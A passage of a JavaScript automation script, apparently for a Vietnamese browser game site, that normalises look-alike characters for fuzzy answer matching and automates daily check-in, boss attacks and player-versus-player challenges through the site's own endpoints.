    'а': 'a', 'с': 'c', 'е': 'e', 'о': 'o', 'р': 'p', 'х': 'x', 'у': 'y', 'т': 't',
    'в': 'b', 'н': 'h', 'к': 'k', 'м': 'm', 'л': 'n', 'ѕ': 's', 'ј': 'j', 'і': 'i',
    'ѵ': 'v', 'ӏ': 'l', 'д': 'd', 'ё': 'e', 'г': 'g', 'һ': 'h', 'қ': 'k', 'з': 'z',

    // Cyrillic uppercase
    'А': 'A', 'С': 'C', 'Е': 'E', 'О': 'O', 'Р': 'P', 'Х': 'X', 'У': 'Y', 'Т': 'T',
    'В': 'B', 'Н': 'H', 'К': 'K', 'М': 'M', 'Л': 'N', 'Ѕ': 'S', 'Ј': 'J', 'І': 'I',
    'Ѵ': 'V', 'Ӏ': 'L', 'Д': 'D', 'Ё': 'E', 'Г': 'G', 'Һ': 'H', 'Қ': 'K', 'З': 'Z',

    // Greek lowercase
    'α': 'a', 'β': 'b', 'γ': 'g', 'δ': 'd', 'ε': 'e', 'ζ': 'z', 'η': 'h', 'θ': 'th',
    'ι': 'i', 'κ': 'k', 'λ': 'l', 'μ': 'm', 'ν': 'n', 'ξ': 'ks', 'ο': 'o', 'π': 'p',
    'ρ': 'r', 'σ': 's', 'τ': 't', 'υ': 'u', 'φ': 'ph', 'χ': 'x', 'ψ': 'ps', 'ω': 'w',

    // Greek uppercase
    'Α': 'A', 'Β': 'B', 'Γ': 'G', 'Δ': 'D', 'Ε': 'E', 'Ζ': 'Z', 'Η': 'H', 'Θ': 'TH',
    'Ι': 'I', 'Κ': 'K', 'Λ': 'L', 'Μ': 'M', 'Ν': 'N', 'Ξ': 'KS', 'Ο': 'O', 'Π': 'P',
    'Ρ': 'R', 'Σ': 'S', 'Τ': 'T', 'Υ': 'U', 'Φ': 'PH', 'Χ': 'X', 'Ψ': 'PS', 'Ω': 'W',

    // Armenian lowercase
    'ɑ': 'a', 'օ': 'o', 'ս': 's', 'ե': 'e', 'զ': 'z', 'կ': 'k', 'ո': 'n', 'ռ': 'r',
    'հ': 'h', 'լ': 'l', 'մ': 'm', 'ն': 'n', 'վ': 'v', 'տ': 't', 'բ': 'b', 'դ': 'd',
    'ճ': 'c', 'ջ': 'j', 'յ': 'y', 'ք': 'k', 'է': 'e',

    // Armenian uppercase
    'Ա': 'A', 'Օ': 'O', 'Ս': 'S', 'Ե': 'E', 'Զ': 'Z', 'Կ': 'K', 'Ո': 'N', 'Ր': 'R',
    'Հ': 'H', 'Լ': 'L', 'Մ': 'M', 'Ն': 'N', 'Վ': 'V', 'Տ': 'T', 'Բ': 'B', 'Դ': 'D',
    'Ճ': 'C', 'Ջ': 'J', 'Յ': 'Y', 'Ք': 'K',

    // Vietnamese lowercase
    'à': 'a', 'á': 'a', 'ả': 'a', 'ã': 'a', 'ạ': 'a', 'ă': 'a', 'ằ': 'a', 'ắ': 'a',
    'ẳ': 'a', 'ẵ': 'a', 'ặ': 'a', 'â': 'a', 'ầ': 'a', 'ấ': 'a', 'ẩ': 'a', 'ẫ': 'a',
    'ậ': 'a', 'è': 'e', 'é': 'e', 'ẻ': 'e', 'ẽ': 'e', 'ẹ': 'e', 'ê': 'e', 'ề': 'e',
    'ế': 'e', 'ể': 'e', 'ễ': 'e', 'ệ': 'e', 'ì': 'i', 'í': 'i', 'ỉ': 'i', 'ĩ': 'i',
    'ị': 'i', 'ò': 'o', 'ó': 'o', 'ỏ': 'o', 'õ': 'o', 'ọ': 'o', 'ô': 'o', 'ồ': 'o',
    'ố': 'o', 'ổ': 'o', 'ỗ': 'o', 'ộ': 'o', 'ơ': 'o', 'ờ': 'o', 'ớ': 'o', 'ở': 'o',
    'ỡ': 'o', 'ợ': 'o', 'ù': 'u', 'ú': 'u', 'ủ': 'u', 'ũ': 'u', 'ụ': 'u', 'ư': 'u',
    'ừ': 'u', 'ứ': 'u', 'ử': 'u', 'ữ': 'u', 'ự': 'u', 'ỳ': 'y', 'ý': 'y', 'ỷ': 'y',
    'ỹ': 'y', 'ỵ': 'y', 'đ': 'd',

    // Vietnamese uppercase
    'À': 'A', 'Á': 'A', 'Ả': 'A', 'Ã': 'A', 'Ạ': 'A', 'Ă': 'A', 'Ằ': 'A', 'Ắ': 'A',
    'Ẳ': 'A', 'Ẵ': 'A', 'Ặ': 'A', 'Â': 'A', 'Ầ': 'A', 'Ấ': 'A', 'Ẩ': 'A', 'Ẫ': 'A',
    'Ậ': 'A', 'È': 'E', 'É': 'E', 'Ẻ': 'E', 'Ẽ': 'E', 'Ẹ': 'E', 'Ê': 'E', 'Ề': 'E',
    'É': 'E', 'Ể': 'E', 'Ễ': 'E', 'Ệ': 'E', 'Ì': 'I', 'Í': 'I', 'Ỉ': 'I', 'Ĩ': 'I',
    'Ị': 'I', 'Ò': 'O', 'Ó': 'O', 'Ỏ': 'O', 'Õ': 'O', 'Ọ': 'O', 'Ô': 'O', 'Ồ': 'O',
    'Ố': 'O', 'Ổ': 'O', 'Ỗ': 'O', 'Ộ': 'O', 'Ơ': 'O', 'Ờ': 'O', 'Ớ': 'O', 'Ở': 'O',
    'Ỡ': 'O', 'Ợ': 'O', 'Ù': 'U', 'Ú': 'U', 'Ủ': 'U', 'Ũ': 'U', 'Ụ': 'U', 'Ư': 'U',
    'Ừ': 'U', 'Ứ': 'U', 'Ử': 'U', 'Ữ': 'U', 'Ự': 'U', 'Ỳ': 'Y', 'Ý': 'Y', 'Ỷ': 'Y',
    'Ỹ': 'Y', 'Ỵ': 'Y', 'Đ': 'D',

    // Fullwidth Latin lowercase
    'ａ': 'a', 'ｂ': 'b', 'ｃ': 'c', 'ｄ': 'd', 'ｅ': 'e', 'ｆ': 'f', 'ｇ': 'g', 'ｈ': 'h',
    'ｉ': 'i', 'ｊ': 'j', 'ｋ': 'k', 'ｌ': 'l', 'ｍ': 'm', 'ｎ': 'n', 'ｏ': 'o', 'ｐ': 'p',
    'ｑ': 'q', 'ｒ': 'r', 'ｓ': 's', 'ｔ': 't', 'ｕ': 'u', 'ｖ': 'v', 'ｗ': 'w', 'ｘ': 'x',
    'ｙ': 'y', 'ｚ': 'z',

    // Fullwidth Latin uppercase
    'Ａ': 'A', 'Ｂ': 'B', 'Ｃ': 'C', 'Ｄ': 'D', 'Ｅ': 'E', 'Ｆ': 'F', 'Ｇ': 'G', 'Ｈ': 'H',
    'Ｉ': 'I', 'Ｊ': 'J', 'Ｋ': 'K', 'Ｌ': 'L', 'Ｍ': 'M', 'Ｎ': 'N', 'Ｏ': 'O', 'Ｐ': 'P',
    'Ｑ': 'Q', 'Ｒ': 'R', 'Ｓ': 'S', 'Ｔ': 'T', 'Ｕ': 'U', 'Ｖ': 'V', 'Ｗ': 'W', 'Ｘ': 'X',
    'Ｙ': 'Y', 'Ｚ': 'Z',

    // Fullwidth digits
    '０': '0', '１': '1', '２': '2', '３': '3', '４': '4', '５': '5', '６': '6', '７': '7',
    '８': '8', '９': '9',

    // Latin extended
    'ⱥ': 'a', 'ⱦ': 't', 'Ɐ': 'A', 'Ɽ': 'R', 'ƀ': 'b', 'ƃ': 'b', 'ƈ': 'c', 'ɗ': 'd',
    'ƒ': 'f', 'ɠ': 'g', 'ɦ': 'h', 'ɨ': 'i', 'ƙ': 'k', 'ɱ': 'm', 'ɲ': 'n', 'ɵ': 'o',
    'ʠ': 'q', 'ʂ': 's', 'ʈ': 't', 'ⱳ': 'w', 'ⱹ': 'r', 'ʋ': 'v', 'ⱺ': 'o', 'ƴ': 'y',
    'ƶ': 'z', 'Ɓ': 'B', 'Ƈ': 'C', 'Ɗ': 'D', 'Ƒ': 'F', 'Ɠ': 'G', 'Ƙ': 'K', 'Ɲ': 'N',
    'Ɵ': 'O', 'Ƣ': 'OI', 'Ƭ': 'T', 'Ʋ': 'V', 'Ƴ': 'Y', 'Ƶ': 'Z',

    // Cherokee letters
    'Ꭺ': 'go', 'Ꭻ': 'gu', 'Ꭼ': 'gv', 'Ꮜ': 'sa', 'Ꮝ': 's', 'Ꮞ': 'se', 'Ꮟ': 'si', 'Ꮠ': 'so',
    'Ꮡ': 'su', 'Ꮢ': 'sv',

    // IPA letters
    'ɡ': 'g', 'ɢ': 'G', 'ɴ': 'N', 'ʀ': 'R', 'ʟ': 'L', 'ʏ': 'Y', 'ʃ': 's', 'ʒ': 'z',
    'ɾ': 'r', 'ʰ': 'h',

    // Superscript letters and modifier letters
    'ᵃ': 'a', 'ᵇ': 'b', 'ᶜ': 'c', 'ᵈ': 'd', 'ᵉ': 'e', 'ᶠ': 'f', 'ᵍ': 'g', 'ʰ': 'h',
    'ⁱ': 'i', 'ʲ': 'j', 'ᵏ': 'k', 'ˡ': 'l', 'ᵐ': 'm', 'ⁿ': 'n', 'ᵒ': 'o', 'ᵖ': 'p',
    'ʳ': 'r', 'ˢ': 's', 'ᵗ': 't', 'ᵘ': 'u', 'ᵛ': 'v', 'ʷ': 'w', 'ˣ': 'x', 'ʸ': 'y',
    'ᶻ': 'z',

    // Special Unicode letterlike symbols
    'ℓ': 'l', '℮': 'e', 'ℊ': 'g', 'ℍ': 'H', 'ℕ': 'N', 'ℙ': 'P', 'ℚ': 'Q', 'ℝ': 'R',
    'ℤ': 'Z', 'ℂ': 'C', 'ℬ': 'B', 'ℰ': 'E', 'ℱ': 'F', 'ℳ': 'M',
}

const normalize = (source) => {
    return source
        .split('')
        .map(character => latinMap[character] || character)
        .join('').normalize('NFD')
        .replace(/[\u0300-\u036f]/g, '')
        .toLowerCase().replace(/[^a-z0-9 ]+/g, '')
        .replace(/\s+/g, ' ')
        .trim()
}

const levenshteinDistance = (source, target) => {
    const matrix = Array.from({ length: source.length + 1 }, (_, rowIndex) =>
        Array.from({ length: target.length + 1 }, (_, colIndex) =>
            rowIndex === 0 ? colIndex : colIndex === 0 ? rowIndex : 0
        )
    )
    for (let rowIndex = 1; rowIndex <= source.length; rowIndex++) {
        for (let colIndex = 1; colIndex <= target.length; colIndex++) {
            matrix[rowIndex][colIndex] = Math.min(
                matrix[rowIndex - 1][colIndex] + 1,
                matrix[rowIndex][colIndex - 1] + 1,
                matrix[rowIndex - 1][colIndex - 1] + (source[rowIndex - 1] === target[colIndex - 1] ? 0 : 1)
            )
        }
    }
    return matrix[source.length][target.length]
}

const similarityPercent = (source, target) => {
    if (!source && !target) return 100
    const distance = levenshteinDistance(source, target)
    const maxLength = Math.max(source.length, target.length)
    return Number(((1 - distance / maxLength) * 100).toFixed(2))
}

const bestMatch = (sources, target) => {
    const normalizedTarget = normalize(target)
    let bestIndex = -1
    let bestScore = 0
    for (let index = 0; index < sources.length; index++) {
        const source = sources[index]
        const normalizedSource = normalize(source)
        if (normalizedSource === normalizedTarget) {
            logger.log(`🔍 [Vấn Đáp] Khớp tuyệt đối: "${source}" = "${target}"`)
            return { bestIndex: index, bestSource: source, bestScore: 100 }
        }
        const score = similarityPercent(normalizedSource, normalizedTarget)
        if (score > bestScore) {
            bestIndex = index
            bestScore = score
        }
    }
    if (bestIndex === -1) {
        logger.log(`🔍 [Vấn Đáp] Không có kết quả phù hợp với: "${target}"`)
        return { bestIndex, bestSource: null, bestScore }
    }
    logger.log(`🔍 [Vấn Đáp] Gần đúng nhất: "${sources[bestIndex]}" ≈ "${target}" ➤ giống nhau ${bestScore}%`)
    return { bestIndex, bestSource: sources[bestIndex], bestScore }
}

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms))

const parseVariableJSON = (doc, scriptId, name) => {
    try {
        const script = doc.getElementById(scriptId)?.textContent
        const match = script?.match(`var\\s+${name}\\s*=\\s*(\\{[\\s\\S]*?\\});`)
        if (!match) return {}
        return JSON.parse(match[1])
    } catch {
        return {}
    }
}

const parseRequestData = (html) => {
    return [...html.matchAll(/data\s*(?:=|:)\s*{([\s\S]*?)}/g)].map(result => {
        const content = result[1]
        const action = (content.match(/['"]?action['"]?\s*:\s*['"]([^'"]+)['"]/) || [])[1] || ''
        const nonce = (content.match(/['"]?nonce['"]?\s*:\s*['"]([a-f0-9]+)['"]/) || [])[1] || ''
        const security = (content.match(/['"]?security['"]?\s*:\s*['"]([a-f0-9]+)['"]/) || [])[1] || ''
        return action ? { action, nonce, security } : null
    }).filter(Boolean)
}

class DiemDanh {
    async trigger() {
        try {
            const page = await loadPage(DOMAIN + '/diem-danh')
            const checkInButton = page.doc.querySelector('#checkInButton')
            if (checkInButton && checkInButton.disabled) return logger.log(`🟢 [Điểm Danh] - Đã hoàn thành.`)
            const variableJSON = parseVariableJSON(page.doc, 'better-messages-js-extra', 'Better_Messages')
            await this.checkIn(variableJSON.nonce)
        } catch (error) {
            console.log(`🔴 [Điểm Danh] - Lỗi "trigger": ${error.message}`)
        }
    }

    async checkIn(nonce) {
        if (!nonce) return console.log(`🔴 [Điểm Danh] - Không tìm thấy nonce daily_check_in.`)
        const result = await postRequest(ACTION_URL, {
            headers: { 'Content-Type': 'application/json', 'X-WP-Nonce': nonce },
            body: JSON.stringify({ action: 'daily_check_in' })
        })
        const message = result?.success === true
            ? `🟢 [Điểm Danh] - Thành công.`
            : `🔴 [Điểm Danh] - ${result?.message || result}`
        logger.log(message)
    }
}

class HoangVuc {
    async trigger() {
        try {
            const page = await loadPage(DOMAIN + '/hoang-vuc')
            const nonce = page.html.match(/var\s+ajax_boss_nonce\s*=\s*'([^']+)'/)?.[1]
            const hasReward = page.html.includes('id="reward-button"')
            if (hasReward) {
                await this.claimChest(nonce)
                return await this.trigger()
            }
            const hasBoss = page.doc.getElementById('battle-button')
            if (!hasBoss) return logger.log(`🟡 [Hoang Vực] - Boss chưa mở.`)
            const match = page.doc.querySelector('.remaining-attacks')?.textContent?.match(/\d+/)
            const remaining = match ? parseInt(match[0] || '0', 10) : 0
            if (remaining === 0) return logger.log(`🟢 [Hoang Vực] - Đã hoàn thành.`)
            const distance = await this.getNextAttackTime()
            if (distance === null || distance > 0) return logger.log(`🟡 [Hoang Vực] - Chưa đến thời gian đánh - Còn lại ${remaining} lượt.`)
            const bossId = page.html.match(/boss_id\s*==\s*"(\d+)"/)?.[1]
            await this.attackBoss(nonce, bossId, remaining)
        } catch (error) {
            console.log(`🔴 [Hoang Vực] - Lỗi "trigger": ${error.message}`)
        }
    }

    async claimChest(nonce) {
        if (!nonce) return console.log(`🔴 [Hoang Vực] - Không tìm thấy nonce claim_chest.`)
        const result = await postRequest(ADMIN_AJAX_URL, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ action: 'claim_chest', nonce })
        })
        if (result.error) return logger.log(`❌ [Hoang Vực] - ${result.error}`)
        logger.log(`✅ [Hoang Vực] - Nhận thưởng thành công.`)
        const rewards = result.total_rewards || {}
        const rewardLogs = []
        if (rewards.tu_vi) rewardLogs.push(`✨ Tu Vi: ${rewards.tu_vi}`)
        if (rewards.tinh_thach) rewardLogs.push(`💎 Tinh Thạch: ${rewards.tinh_thach}`)
        if (rewards.tinh_huyet) rewardLogs.push(`🩸 Tinh Huyết: ${rewards.tinh_huyet}`)
        if (rewards.tien_ngoc) rewardLogs.push(`🔮 Tiên Ngọc: ${rewards.tien_ngoc}`)
        if (rewardLogs.length) logger.log(rewardLogs.join(' | '))
    }

    async getNextAttackTime() {
        const result = await postRequest(HH3D_AJAX_URL, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ action: 'get_next_attack_time' })
        })
        if (result?.success && typeof result?.data === 'number') {
            const now = new Date().getTime()
            const distance = result.data - now
            return distance
        }
        return null
    }

    async attackBoss(nonce, bossId, remaining) {
        if (!nonce) return console.log(`🔴 [Hoang Vực] - Không tìm thấy nonce attack_boss.`)
        if (!bossId) return console.log(`🔴 [Hoang Vực] - Không tìm thấy bossId attack_boss.`)
        const requestId = 'req_' + Math.random().toString(36).slice(2, 11) + '_' + Date.now()
        const result = await postRequest(HH3D_AJAX_URL, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ action: 'attack_boss', boss_id: bossId, nonce, request_id: requestId })
        })
        const message = result?.success === true
            ? `🟢 [Hoang Vực] - Tấn công thành công - Còn lại ${remaining - 1} lượt.`
            : `🔴 [Hoang Vực] - Tấn công thất bại - ${result?.data?.error}`
        logger.log(message)
    }
}

class LuanVo {
    constructor(page = null) {
        this.page = page
        this.battleData = null
    }

    async triggerReceive(isOn = true) {
        try {
            if (this.battleData === null) this.battleData = await this.prepareTrigger()
            if (this.battleData === null || this.battleData.reward) return
            if (this.battleData.received >= 5) return logger.log(`🟡 [Luận Võ] - Đã nhận tối đa.`)
            const receivedBadgeValue = parseInt(this.page.doc.querySelector('#ViewReceivedChallengesBtn .notification-badge')?.textContent.trim() || '0')
            if (isOn && receivedBadgeValue > 0) {
                await this.rejectAllReceivedChallenges()
            }
            if (this.battleData.isAutoOn !== isOn) {
                await this.toggleAutoAccept(isOn)
            } else {
                logger.log(`🟢 [Luận Võ] - Đang ${isOn ? 'bật' : 'tắt'} tự động khiêu chiến.`)
            }
        } catch (error) {
            console.log(`🔴 [Luận Võ] - Lỗi "triggerReceive": ${error.message}`)
            return { challenges: [], nonce: null }
        }
    }

    async triggerSend({ following = true, online = false, retries = 3 } = {}) {
        try {
            if (this.battleData === null) this.battleData = await this.prepareTrigger()
            if (this.battleData === null || this.battleData.reward) return
            if (this.battleData.sent >= 5) return logger.log(`🟢 [Luận Võ] - Đã gửi tối đa.`)
            await this.loadPageIfNeeded()
            const sentBadgeValue = parseInt(this.page.doc.querySelector('#ViewSentChallengesBtn .notification-badge')?.textContent.trim() || '0')
            if (sentBadgeValue > 0) {
                await this.rejectAllSentChallenges()
            }
            const variableJSON = parseVariableJSON(this.page.doc, 'luan-vo-main-js-extra', 'LuanVoConfig')
            let users = []
            let targetUsers
            if (following) {
                users = await this.getUsers({ action: '/get-following-users', nonce: variableJSON.nonce, loadmore: true })
                targetUsers = users.filter(user => user.challenges_remaining > 0)
            } else if (online) {
                users = await this.getUsers({ action: '/online-users', nonce: variableJSON.nonce, loadmore: false })
                targetUsers = users.filter(user => user.auto_accept && user.challenges_remaining > 0)
            } else {
                return logger.log(`🟡 [Luận Võ] - Chưa hoàn thành gửi khiêu chiến.`)
            }
            let index = 0
            while (index < targetUsers.length && this.battleData.sent < 5) {
                const target = targetUsers[index]
                if (!target.auto_accept) {
                    index++
                    continue
                }
                if (target.challenges_remaining < 1) {
                    targetUsers.splice(index, 1)
                    continue
                }
                const sentData = await this.sendChallenge(target, variableJSON.nonce)
                if (typeof sentData === 'string' && sentData.toLowerCase().includes('tối đa')) {
                    if (sentData.toLowerCase().includes('nhận tối đa')) {
                        targetUsers.splice(index, 1)
                        continue
                    }
                    console.log(`🟡 [Luận Võ] - Đã gửi tối đa - ${sentData}`)
                    await this.loadPageIfNeeded(true)
                    this.battleData = await this.prepareTrigger()
                    return
                }
                if (typeof sentData === 'object' && sentData !== null) {
                    const sentResult = await this.approveChallenge(sentData, variableJSON.nonce)
                    if (!sentResult) {
                        targetUsers.splice(index, 1)
                        continue
                    }
                    let remaining = parseInt(sentResult?.received_remaining, 10) || 0
                    target.challenges_remaining = Math.min(target.challenges_remaining - 1, remaining)
                    this.battleData.sent++
                } else {
                    targetUsers.splice(index, 1)
                }
                if (index < targetUsers.length && this.battleData.sent < 5) await sleep(5000)
            }
            if (this.battleData.sent >= 5) {
                await this.loadPageIfNeeded(true)
                this.battleData = await this.prepareTrigger()
                return console.log(`🟢 [Luận Võ] - Đã gửi tối đa.`)
            }
            if (!targetUsers.length && retries > 0) return this.triggerSend({ following: false, online: true, retries: retries - 1 })
            logger.log(`🟡 [Luận Võ] - Chưa hoàn thành gửi khiêu chiến.`)
        } catch (error) {
            console.log(`🔴 [Luận Võ] - Lỗi "triggerSend": ${error.message}`)
            return { challenges: [], nonce: null }
        }
    }

    async rejectAllReceivedChallenges() {
        const { challenges, nonce } = await this.getReceivedChallenges()
        for (const challenge of challenges) {
            await this.rejectReceivedChallenge(challenge, nonce)
        }
    }

    async rejectAllSentChallenges() {
        const { challenges, nonce } = await this.getSentChallenges()
        for (const challenge of challenges) {
            await this.rejectSentChallenge(challenge, nonce)
        }
    }

    async prepareTrigger() {
        const getValue = (label, doc) => {
            const p = Array.from(doc.querySelectorAll('p')).find(p => p.textContent.trim().startsWith(label))
            const text = p?.querySelector('span.highlight')?.textContent || ''
            const match = text.match(/^(\d+)/)
            return match ? parseInt(match[1]) : 0
        }

        await this.loadPageIfNeeded()
        if (this.page.doc.getElementById('joinBattleImg')) {
            if (await this.joinBattle()) {
                this.page = await loadPage(DOMAIN + '/luan-vo-duong')
            } else {
                return null
            }
        }
        const sent = getValue('Đã gửi:', this.page.doc)
        const received = getValue('Đã nhận:', this.page.doc)
        const isAutoOn = !!this.page.doc.getElementById('auto_accept_toggle')?.checked
        let reward = false
        if (sent >= 5 && received >= 5) {
            const rewardBtn = this.page.doc.getElementById('receive-reward-btn')
            const nonce = parseVariableJSON(this.page.doc, 'luan-vo-main-js-extra', 'LuanVoConfig').nonce
            if (rewardBtn && nonce) {
                reward = await this.receiveReward(nonce)
            } else {
                logger.log(`🟢 [Luận Võ] - Đã nhận thưởng.`)
                reward = true
            }
        }
        return { sent, received, isAutoOn, reward }
    }

    async loadPageIfNeeded(force = false) {
        if (!this.page || force) this.page = await loadPage(DOMAIN + '/luan-vo-duong')
    }

    async getUsers({ action, nonce, page = 1, current = [], loadmore, maxPages = 10 }) {
        try {
            if (!nonce) {
                console.log(`🔴 [Luận Võ] - Không tìm thấy nonce ${action}.`)
                return []
            }
            const result = await postRequest(LUANVO_URL + action, {
                headers: { 'Content-Type': 'application/json', 'x-wp-nonce': nonce },
                body: JSON.stringify({ page })
            })
            const { success, data } = result || {}
            const { users, load_more } = data || {}
            if (!success || !users) return current
            const allUsers = [...current, ...users]
            if (load_more === true && loadmore) {
                if (page >= maxPages) {
                    return allUsers
                }
                return await this.getUsers({ action, nonce, page: page + 1, current: allUsers, loadmore: true })
            }
            return allUsers
        } catch (error) {
            console.log(`🔴 [Luận Võ] - Lỗi "getUsers": ${error.message}`)
            return current
        }
    }

    async getReceivedChallenges() {
        try {
            await this.loadPageIfNeeded()
            const variableJSON = parseVariableJSON(this.page.doc, 'luan-vo-main-js-extra', 'LuanVoConfig')
            const nonce = variableJSON.nonce
            if (!nonce) {
                console.log(`🔴 [Luận Võ] - Không tìm thấy nonce get_received_challenges.`)
                return { challenges: [], nonce: null }
            }
            const result = await postRequest(LUANVO_URL + '/get-received-challenges', {
                headers: { 'Content-Type': 'application/json', 'x-wp-nonce': nonce }
            })
            if (!result?.success || !result.data?.html) {
                console.log(`🔴 [Luận Võ] - Phản hồi không hợp lệ từ get_received_challenges.`)
                return { challenges: [], nonce }
            }
            const doc = new DOMParser().parseFromString(result.data.html, 'text/html')
            const challenges = Array.from(doc.querySelectorAll('tbody tr')).map(row => {
                const request = row.querySelector('.approve-request')
                const name = row.querySelector('.challenger-name')?.textContent.trim() || ''
                const target_user_id = request?.getAttribute('data-user-id').trim() || ''
                const challenge_id = request?.getAttribute('data-challenge-id').trim() || ''
                return { name, target_user_id, challenge_id }
            }).filter(challenge => challenge.target_user_id && challenge.challenge_id)
            return { challenges, nonce }
        } catch (error) {
            console.log(`🔴 [Luận Võ] - Lỗi "getReceivedChallenges": ${error.message}`)
            return { challenges: [], nonce: null }
        }
    }

    async getSentChallenges() {
        try {
            await this.loadPageIfNeeded()
            const variableJSON = parseVariableJSON(this.page.doc, 'luan-vo-main-js-extra', 'LuanVoConfig')
            const nonce = variableJSON.nonce
            if (!nonce) {
                console.log(`🔴 [Luận Võ] - Không tìm thấy nonce get-sent-challenges.`)
                return { challenges: [], nonce: null }
            }
            const result = await postRequest(LUANVO_URL + '/get-sent-challenges', {
                headers: { 'Content-Type': 'application/json', 'x-wp-nonce': nonce }
            })
            if (!result?.success || !result.data?.html) {
                console.log(`🔴 [Luận Võ] - Phản hồi không hợp lệ từ get-sent-challenges.`)
                return { challenges: [], nonce }
            }
            const doc = new DOMParser().parseFromString(result.data.html, 'text/html')
            const challenges = Array.from(doc.querySelectorAll('tbody tr')).map(row => {
                const request = row.querySelector('.reject-request')
                const name = row.querySelector('.challenger-name')?.textContent.trim() || ''
                const target_user_id = request?.getAttribute('data-user-id').trim() || ''
                const challenge_id = request?.getAttribute('data-challenge-id').trim() || ''
                return { name, target_user_id, challenge_id }
            }).filter(challenge => challenge.target_user_id && challenge.challenge_id)
            return { challenges, nonce }
        } catch (error) {
            console.log(`🔴 [Luận Võ] - Lỗi "getSentChallenges": ${error.message}`)
            return { challenges: [], nonce: null }
        }
    }

    async rejectReceivedChallenge(challenge, nonce) {
        if (!nonce) return console.log(`🔴 [Luận Võ] - Không tìm thấy nonce reject-challenge`)
        const result = await postRequest(LUANVO_URL + '/reject-challenge', {
            headers: { 'Content-Type': 'application/json', 'x-wp-nonce': nonce },
            body: JSON.stringify({ target_user_id: challenge.target_user_id, challenge_id: challenge.challenge_id })
        })
        const message = result?.success === true
            ? `✅ [Luận Võ] - Từ chối thành công yêu cầu của ${challenge.name} (${challenge.target_user_id})`
            : `❌ [Luận Võ] - Từ chối thất bại yêu cầu của ${challenge.name} (${challenge.target_user_id})`
        logger.log(message)
    }

    async rejectSentChallenge(challenge, nonce) {
        if (!nonce) return console.log(`🔴 [Luận Võ] - Không tìm thấy nonce cancel-challenge`)
        const result = await postRequest(LUANVO_URL + '/cancel-challenge', {
            headers: { 'Content-Type': 'application/json', 'x-wp-nonce': nonce },
            body: JSON.stringify({ target_user_id: challenge.target_user_id, challenge_id: challenge.challenge_id })
        })
        const message = result?.success === true
            ? `✅ [Luận Võ] - Huỷ thành công yêu cầu đến ${challenge.name} (${challenge.target_user_id})`
            : `❌ [Luận Võ] - Huỷ thất bại yêu cầu đến ${challenge.name} (${challenge.target_user_id})`
        logger.log(message)
    }

    async sendChallenge(user, nonce) {
        if (!nonce) {
            console.log(`🔴 [Luận Võ] - Không tìm thấy nonce send_challenge`)
            return null
        }
        const result = await postRequest(LUANVO_URL + '/send-challenge', {
            headers: { 'Content-Type': 'application/json', 'x-wp-nonce': nonce },
            body: JSON.stringify({ target_user_id: user.id })
        })
        const message = result?.success === true && result.data
            ? `⚔️ [Luận Võ] Đã gửi khiêu chiến đến ${user.name} (${user.id})`
            : `❌ [Luận Võ] Gửi khiêu chiến không thành công đến ${user.name} (${user.id})`
        logger.log(message)
        return result.data
    }

    async approveChallenge(challenge, nonce) {
        if (!nonce) {
            console.log(`🔴 [Luận Võ] - Không tìm thấy nonce auto-approve-challenge`)
            return null
        }
        const result = await postRequest(LUANVO_URL + '/auto-approve-challenge', {
            headers: { 'Content-Type': 'application/json', 'x-wp-nonce': nonce },
            body: JSON.stringify({ target_user_id: challenge.target_user_id, challenge_id: challenge.challenge_id })
        })
        const message = result?.success === true && result.data
            ? `✅ [Luận Võ] Gửi khiêu chiến hoàn thành.`
            : `❌ [Luận Võ] Gửi khiêu chiến bất thành.`
        logger.log(message)
        return result.data
    }

    async joinBattle() {
        await this.loadPageIfNeeded()
        const nonce = parseVariableJSON(this.page.doc, 'better-messages-js-extra', 'Better_Messages').nonce
        if (!nonce) {
            console.log(`🔴 [Luận Võ] - Không tìm thấy nonce join_battle_new.`)
            return false
        }
        const result = await postRequest(ACTION_URL, {
            headers: { 'Content-Type': 'application/json', 'x-wp-nonce': nonce },
            body: JSON.stringify({ action: 'join_battle_new' })
        })
        const message = result?.success === true
            ? `✅ [Luận Võ] - Tham gia thành công.`
            : `❌ [Luận Võ] - Tham gia thất bại.`
        logger.log(message)
        return !!result?.success
    }

    async toggleAutoAccept(isOn) {
        await this.loadPageIfNeeded()
        const nonce = parseVariableJSON(this.page.doc, 'luan-vo-main-js-extra', 'LuanVoConfig').nonce
        if (!nonce) return console.log(`🔴 [Luận Võ] - Không tìm thấy nonce toggle_auto_accept.`)
        const result = await postRequest(LUANVO_URL + '/toggle-auto-accept', {
            headers: { 'Content-Type': 'application/json', 'x-wp-nonce': nonce }
        })
        const message = result?.success === true
            ? `✅ [Luận Võ] - ${result.message || ''}`
            : `❌ [Luận Võ] - ${isOn ? 'Bật' : 'Tắt'} tự động nhận khiêu chiến thất bại.`
        this.battleData.isAutoOn = message.toLowerCase().includes('bật')
        logger.log(message)
    }

    async receiveReward(nonce) {
        if (!nonce) {
            console.log(`🔴 [Luận Võ] - Không tìm thấy nonce receive-reward.`)
            return false
        }
        const result = await postRequest(LUANVO_URL + '/receive-reward', {
            headers: { 'Content-Type': 'application/json', 'x-wp-nonce': nonce }
        })
        const message = result?.success === true
            ? `✅ [Luận Võ] - Nhận thưởng thành công - ${result.message}`
            : `❌ [Luận Võ] - Nhận thưởng thất bại - ${result?.message}`
        logger.log(message)
        return !!result?.success
    }

    async triggerFollow(ids, clean = false) {
        try {
            await this.loadPageIfNeeded()
            const variableJSON = parseVariableJSON(this.page.doc, 'luan-vo-main-js-extra', 'LuanVoConfig')
            if (clean) {
                const users = await this.getUsers({ action: 'get_following_users', nonce: variableJSON.nonce, loadmore: true })
                const ids = users.map(user => user.id)
                await this.triggerUnfollow(ids, variableJSON)
            }
            const currentId = parseInt(variableJSON.current_user_id)
            if (!variableJSON.nonce) return console.log(`🔴 [Luận Võ] - Không tìm thấy nonce follow`)
            for (const id of ids) {
                if (id === currentId) continue
                const result = await postRequest(LUANVO_URL + '/follow', {
                    headers: { 'Content-Type': 'application/json', 'x-wp-nonce': variableJSON.nonce },
                    body: JSON.stringify({ unfollow_user_id: id })
                })
                const message = result?.success === true
                    ? `✅ [Luận Võ] - Theo dõi thành công ID: ${id}`
                    : `❌ [Luận Võ] - Theo dõi thất bại ID: ${id}`
                logger.log(message)
            }
            logger.log(`🟢 [Luận Võ] - Hoàn thành xử lý theo dõi.`)
        } catch (error) {
